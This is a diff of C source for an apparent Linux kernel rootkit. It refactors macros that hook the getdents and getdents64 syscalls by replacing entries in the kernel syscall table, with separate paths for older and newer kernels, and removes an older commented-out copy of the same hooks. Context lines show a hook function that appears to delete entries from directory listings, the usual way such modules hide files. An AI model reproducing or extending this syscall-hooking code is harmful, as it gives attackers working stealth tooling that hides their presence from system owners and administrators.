@@ -39,10 +39,10 @@ struct linux_dirent64 {
 
 unsigned long *syscall_table = NULL;
 
-//HOOK DEFINING
-//similar to the way kernel defines syscalls using SYSCALL_DEFINEx
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0) //pt_regs struct
-//similar to the way kernel defines __MAP in syscalls.h
+// HOOK DEFINING MACROS ---------------------------------------------
+//similar to how kernel defines syscalls using SYSCALL_DEFINEx
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0) //pt_regs struct for args, kernel >= 4.17
+//similar to how kernel defines __MAP in syscalls.h
 #define args1 regs->di
 #define args2 args1, regs->si
 #define args3 args2, regs->dx
@@ -50,55 +50,30 @@ unsigned long *syscall_table = NULL;
 #define args5 args4, regs->r8
 #define args6 args5, regs->r9
 #define args(n) args##n
-#define hook_define(n_args, ret_type, syscall_name, ...) \
-	asmlinkage ret_type sys_##syscall_name##_do_hook(__MAP(n_args, __SC_DECL, __VA_ARGS__), ret_type ret); \
-	asmlinkage ret_type (*sys_##syscall_name##_orig)(const struct pt_regs* regs); \
-	asmlinkage ret_type sys_##syscall_name##_hook(const struct pt_regs* regs){    \
-		ret_type ret = sys_##syscall_name##_orig(regs);                           \
-		return sys_##syscall_name##_do_hook(args(n_args), ret);                   \
-	}
+#define DECL_DO_HOOK(n_args, ret_type, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), ret_type ret
+#define DECL_ORIG_HOOK(n_args, ...) const struct pt_regs* regs
+#define ARGS_ORIG(n_args, ...) regs
+#define ARGS_DO_HOOK(n_args, ...) args(n_args), ret
 
-#else //normal args
-#define hook_define(n_args, ret_type, syscall_name, ...) \
-	asmlinkage ret_type sys_##syscall_name##_do_hook(__MAP(n_args, __SC_DECL, __VA_ARGS__), ret_type ret); \
-	asmlinkage ret_type (*sys_##syscall_name##_orig)(__MAP(n_args, __SC_DECL, __VA_ARGS__));  \
-	asmlinkage ret_type sys_##syscall_name##_hook(__MAP(n_args, __SC_DECL, __VA_ARGS__)){     \
-		ret_type ret = sys_##syscall_name##_orig(__MAP(n_args, __SC_ARGS, __VA_ARGS__));      \
-		return sys_##syscall_name##_do_hook(__MAP(n_args, __SC_ARGS, __VA_ARGS__), ret);      \
-	}
-
+#else //normal args, kernel < 4.17
+#define DECL_DO_HOOK(n_args, ret_type, ...) DECL_ORIG_HOOK(n_args, __VA_ARGS__), ret_type ret
+#define DECL_ORIG_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__)
+#define ARGS_ORIG(n_args, ...) __MAP(n_args, __SC_ARGS, __VA_ARGS__)
+#define ARGS_DO_HOOK(n_args, ...) ARGS_ORIG(n_args, __VA_ARGS__), ret
 #endif
+
+#define hook_define(n_args, ret_type, syscall_name, ...) \
+	asmlinkage ret_type sys_##syscall_name##_do_hook(DECL_DO_HOOK(n_args, ret_type, __VA_ARGS__)); \
+	asmlinkage ret_type (*sys_##syscall_name##_orig)(DECL_ORIG_HOOK(n_args, __VA_ARGS__));         \
+	asmlinkage ret_type sys_##syscall_name##_hook(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){            \
+		ret_type ret = sys_##syscall_name##_orig(ARGS_ORIG(n_args, __VA_ARGS__));                  \
+		return sys_##syscall_name##_do_hook(ARGS_DO_HOOK(n_args, __VA_ARGS__));                    \
+	}
+// END HOOK DEFINING MACROS -----------------------------------------
+
 hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count);
 hook_define(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count);
-//ENDTESTING-------------------------------------------------------------------
 
-
-/*
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
-asmlinkage long (*sys_getdents_orig)(const struct pt_regs* regs);
-asmlinkage long sys_getdents_hook(const struct pt_regs* regs){
-	long leidos = sys_getdents_orig(regs);
-	return sys_getdents_do_hook(regs->di, regs->si, regs->dx, leidos);
-}
-asmlinkage long (*sys_getdents64_orig)(const struct pt_regs* regs);
-asmlinkage long sys_getdents64_hook(const struct pt_regs* regs){
-	long leidos = sys_getdents64_orig(regs);
-	return sys_getdents64_do_hook(regs->di, regs->si, regs->dx, leidos);
-}
-
-#else
-asmlinkage long (*sys_getdents_orig)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
-asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
-	long leidos = sys_getdents_orig(fd, dirent, count);
-	return sys_getdents_do_hook(fd, dirent, count, leidos);
-}
-asmlinkage long (*sys_getdents64_orig)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
-asmlinkage long sys_getdents64_hook(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
-	long leidos = sys_getdents64_orig(fd, dirent, count);
-	return sys_getdents64_do_hook(fd, dirent, count, leidos);
-}
-#endif
-*/
 
 asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, long ret) {
 	int buff_offset, deleted_size;
